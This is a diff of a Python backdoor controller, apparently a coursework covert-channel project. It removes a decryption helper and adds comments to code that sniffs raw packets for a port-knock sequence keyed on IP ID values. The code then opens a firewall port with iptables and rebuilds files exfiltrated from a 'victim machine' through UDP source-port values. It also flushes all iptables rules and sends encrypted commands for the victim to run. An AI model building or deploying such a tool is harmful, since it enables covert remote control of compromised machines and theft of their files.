@@ -60,14 +60,6 @@ def encrypt(text):
     ciphertext = cipher.encrypt(text)
     return ciphertext
 
-def badDecrypt(text):
-    global IV
-    key = "Password"
-    bkey = hashlib.sha256(key).digest()
-    decipher = AES.new(bkey, AES.MODE_CFB, IV)
-    plaintext = decipher.decrypt(text)
-    return plaintext
-
 
 # checksum functions needed for calculation checksum
 def checksum(msg):
@@ -90,7 +82,7 @@ def string_bin(string):
     return ''.join(format(ord(c), 'b') for c in string)
 
 
-
+#listening for packets
 def getFile():
     cap = pcapy.open_live("eno1", 65536, 1, 0)
     while (1):
@@ -98,16 +90,29 @@ def getFile():
         victimFile = parse_file_packet(packet)
 
 
+
+
+
+
+#----------------------------------------------------------------------
+#-- FUNCTION: checkKnock()
+#--
+#-- NOTE:
+#-- Checking for a port knock:
+#-- If we received the correct sequence of packets, we will open a port
+#-- and begin to receive the file from the victim machine
+#-- 
+#-- We are checking for the correct ipid and encrypted message
+#----------------------------------------------------------------------
 def checkKnock(packet):
     global portKnock
     global doorOpen
-
     eth_length = 14
     eth_header = packet[:eth_length]
     eth = unpack('!6s6sH', eth_header)
     eth_protocol = socket.ntohs(eth[2])
-# Parse IP packets, IP Protocol number = 8
 
+    # Parse IP packets, IP Protocol number = 8
     if eth_protocol == 8:
         ip_header = packet[eth_length:20 + eth_length]
         iph = unpack('!BBHHHBBH4s4s', ip_header)
@@ -117,6 +122,8 @@ def checkKnock(packet):
         iph_length = ihl * 4
         ttl = iph[5]
         ipid = iph[3]
+
+        #First knock 
         if (ipid ==4567):
             protocol = iph[6]
             s_addr = socket.inet_ntoa(iph[8]);
@@ -129,6 +136,7 @@ def checkKnock(packet):
                     portKnock[0] = 1
                     print "KNOCK1"
 
+        #Second knock
         elif (ipid == 5678):
             protocol = iph[6]
             s_addr = socket.inet_ntoa(iph[8]);
@@ -145,7 +153,7 @@ def checkKnock(packet):
 
 
 
-
+#handle file from victim
 def receiveFile(packet):
     global fileMessage
     eth_length = 14
@@ -153,6 +161,7 @@ def receiveFile(packet):
     eth = unpack('!6s6sH', eth_header)
     eth_protocol = socket.ntohs(eth[2])
 
+    #open firewall port
     rule = "iptables -A INPUT -p tcp --dport 8505 -j ACCEPT"
     process = subprocess.Popen(rule, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     # Parse IP packets, IP Protocol number = 8
@@ -168,9 +177,8 @@ def receiveFile(packet):
         ipid = iph[3]
 
 
-
+        #handle the file contents 
         if (ipid == 123):
-
             protocol = iph[6]
             s_addr = socket.inet_ntoa(iph[8]);
             d_addr = socket.inet_ntoa(iph[9]);
@@ -179,9 +187,6 @@ def receiveFile(packet):
                 udph_length = 8
                 h_size = eth_length + iph_length + udph_length
                 password = packet[h_size:]
-                #print "test"
-                #print password
-                #if(password == "1000"):
                 u = iph_length + eth_length
                 udp_header = packet[u:u + 8]
                 # now unpack them :)
@@ -190,9 +195,8 @@ def receiveFile(packet):
                 fileMessage.append(source_port)
 
 
-
-        if (ipid ==1234):
-
+        #handle conclusion of file transfer
+        elif (ipid ==1234):
             protocol = iph[6]
             s_addr = socket.inet_ntoa(iph[8]);
             d_addr = socket.inet_ntoa(iph[9]);
@@ -200,12 +204,8 @@ def receiveFile(packet):
                 udph_length = 8
                 h_size = eth_length + iph_length + udph_length
                 password = packet[h_size:]
-                #print "test"
-                #print password
-                #if(password == "1000"):
                 u = iph_length + eth_length
                 udp_header = packet[u:u + 8]
-                # now unpack them :)
                 udph = unpack('!HHHH', udp_header)
                 fileName = packet[h_size:]
 
@@ -221,20 +221,21 @@ def receiveFile(packet):
                 newFile.close()
                 fileString=""
                 fileMessage = []
+
+                #reset port knock flags
                 portKnock [0] = 0
                 portKnock [1] = 0
                 doorOpen = 0
+                #flush iptables
                 rule = "iptables -F"
                 process = subprocess.Popen(rule, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
 
-
+#begin receiving file if both portKock packets received
 def parse_file_packet(packet):
     global fileMessage
     global portKnock
     global doorOpen
-    # parse ethernet header
-
     if (portKnock[0]==1 and portKnock[1]==1):
         doorOpen ==1
         receiveFile(packet)
@@ -244,27 +245,7 @@ def parse_file_packet(packet):
 
 
 
-
-        #if (ttl == 144):
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+#handling user cmd line arguements
 def getCmd():
     protocol = ""
     while True:
@@ -274,19 +255,13 @@ def getCmd():
             protocol = raw_input("Enter protocol to use: TCP or UDP ")
             if (protocol != "TCP" and protocol != "UDP"):
                 break
-
-
         cmd = raw_input("Enter a command: ")
-
         if cmd =="exit":
             print "Exiting"
             sys.exit()
-
-
         elif cmd =="close":
             #drop iptables rule
             print "Closing port"
-
         else :
             encryptedCmd=encrypt(cmd)
             print "Command: " + cmd
@@ -307,7 +282,7 @@ def getCmd():
 
 
 
-
+#send command for victim machine to execute
 def sendCommand(protocol, data, password):
     # http://www.binarytides.com/raw-socket-programming-in-python-linux/
 
